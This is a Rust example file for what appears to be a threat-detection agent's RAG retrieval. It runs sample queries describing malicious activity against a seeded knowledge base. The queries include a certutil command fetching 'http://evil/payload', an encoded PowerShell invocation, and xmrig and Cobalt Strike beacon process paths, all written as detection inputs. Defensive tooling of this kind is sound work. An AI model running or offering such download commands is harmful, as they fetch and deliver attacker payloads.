//! RAG retrieval demo (Sub-tappa 6.7).
//!
//! Builds a [`RagEngine`] seeded with the curated 30-document KB,
//! runs a handful of canonical queries, and prints the top-3 hits
//! per query. No model file required — the embedder used in
//! Sub-tappa 6.7 is the dependency-free hashed n-gram stand-in.
//!
//! Run manually:
//!
//! ```sh
//! cargo run --example rag_demo --release
//! ```

use std::process::ExitCode;
use std::time::Instant;

use northnarrow_agent::rag::{RagEngine, RagQuery};

fn main() -> ExitCode {
    use tracing_subscriber::EnvFilter;
    let _ = tracing_subscriber::fmt()
        .with_env_filter(
            EnvFilter::try_from_default_env().unwrap_or_else(|_| EnvFilter::new("info")),
        )
        .with_target(false)
        .try_init();

    let started = Instant::now();
    let engine = match RagEngine::with_seed(None) {
        Ok(e) => e,
        Err(e) => {
            eprintln!("seed failed: {e}");
            return ExitCode::FAILURE;
        }
    };
    let seed_ms = started.elapsed().as_millis();
    println!(
        "seeded {} documents in {seed_ms} ms",
        engine.document_count()
    );
    println!();

    // Each query exercises a distinct category of the seed KB, plus
    // a deliberate noise query at the end to demonstrate the
    // similarity-threshold fallback (zero hits → no RAG injection).
    let queries: &[(&str, &str)] = &[
        (
            "process xmrig from /tmp/.cache/x",
            "Cryptominer process spawn",
        ),
        (
            "powershell.exe -EncodedCommand base64encoded",
            "PowerShell encoded command",
        ),
        (
            "process beacon from /usr/local/bin/cobaltstrike-beacon",
            "Cobalt Strike beacon",
        ),
        (
            "certutil.exe -urlcache -split -f http://evil/payload",
            "certutil LOLBAS download",
        ),
        (
            "process random_name from /home/user/dev/projectfile",
            "Likely benign — should fall under threshold",
        ),
    ];

    for (q, label) in queries {
        println!("=== Query: {label}");
        println!("    text: {q}");
        let r = engine.retrieve(RagQuery::new(q));
        println!(
            "    embed_ms={} retrieve_ms={} hits={}",
            r.query_embedding_ms,
            r.retrieval_ms,
            r.documents.len()
        );
        if r.is_empty() {
            println!("    (no hits over threshold — ADE proceeds without RAG context)");
        } else {
            for (i, d) in r.documents.iter().enumerate() {
                println!(
                    "    [{}] sim={:.3}  id={}  category={}",
                    i + 1,
                    d.similarity,
                    d.id,
                    d.category
                );
                println!("        title: {}", d.title);
            }
        }
        println!();
    }

    ExitCode::SUCCESS
}
